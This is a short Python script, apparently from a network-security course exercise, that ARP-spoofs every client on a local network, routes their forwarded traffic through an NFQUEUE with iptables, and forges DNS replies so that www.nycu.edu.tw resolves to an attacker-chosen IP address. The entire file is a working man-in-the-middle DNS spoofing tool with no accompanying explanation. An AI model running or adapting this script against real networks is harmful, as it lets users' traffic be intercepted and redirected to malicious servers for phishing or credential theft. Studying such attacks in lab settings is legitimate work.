#!/usr/bin/env python3

import shlex
import subprocess
from subprocess import DEVNULL

from netfilterqueue import NetfilterQueue
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

import arp

QUEUE_NUM = 69
ATTACK_DOMAIN = b"www.nycu.edu.tw."
ATTACK_SERVER_IP = "140.113.207.241"


def fake_dns_res(pkt):
    rcv_pkt = IP(pkt.get_payload())
    # print(f"[DEBUG] received a packet from {rcv_pkt}")
    if not rcv_pkt.haslayer(DNSQR):
        pkt.accept()
        return

    rcv_pkt.show()
    qname = rcv_pkt[DNSQR].qname
    print(f"[DEBUG] qname={qname}")
    if qname != ATTACK_DOMAIN:
        pkt.accept()
        return

    rcv_pkt[DNS].an = DNSRR(rrname=qname, rdata=ATTACK_SERVER_IP)
    rcv_pkt[DNS].ancount = 1

    del rcv_pkt[IP].len
    del rcv_pkt[IP].chksum
    del rcv_pkt[UDP].len
    del rcv_pkt[UDP].chksum

    pkt.set_payload(bytes(rcv_pkt))
    pkt.accept()


def main():
    clients, gateway_ip, gateway_mac = arp.arp_scan()
    arp.print_clients(clients)
    arp.spoof_all(clients, gateway_ip, gateway_mac)

    cmd = f"iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}"
    subprocess.run(shlex.split(cmd), stdout=DEVNULL, stderr=DEVNULL)
    nfq = NetfilterQueue()
    nfq.bind(QUEUE_NUM, fake_dns_res)

    try:
        nfq.run()
    finally:
        nfq.unbind()


if __name__ == "__main__":
    main()
